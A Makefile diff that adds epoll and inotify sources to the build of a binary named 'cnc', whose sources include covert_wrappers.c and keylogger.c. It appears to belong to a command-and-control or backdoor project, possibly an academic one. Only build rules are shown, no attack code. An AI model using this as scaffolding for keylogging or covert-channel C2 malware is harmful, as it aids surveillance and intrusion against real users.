@@ -1,6 +1,7 @@
-main: main.c ../src/libpcap.c ../src/encrypt_utils.c ../src/socketwrappers.c ../src/covert_wrappers.c ../src/keylogger.c
-	gcc -g -o cnc main.c ../src/libpcap.c ../src/encrypt_utils.c ../src/socketwrappers.c ../src/covert_wrappers.c ../src/keylogger.c -lpcap -lcrypto -lpthread
+main: main.c ../src/epoll.c ../src/inotify.c ../src/libpcap.c ../src/encrypt_utils.c ../src/socketwrappers.c ../src/covert_wrappers.c ../src/keylogger.c
+
+	gcc -g -o cnc main.c ../src/epoll.c ../src/inotify.c ../src/libpcap.c ../src/encrypt_utils.c ../src/socketwrappers.c ../src/covert_wrappers.c ../src/keylogger.c -lpcap -lcrypto -pthread
 
 clean:
 	rm -f *.o cnc
-	rm -f .results .cmd.sh
+	rm -f .results .cmd.sh inotify
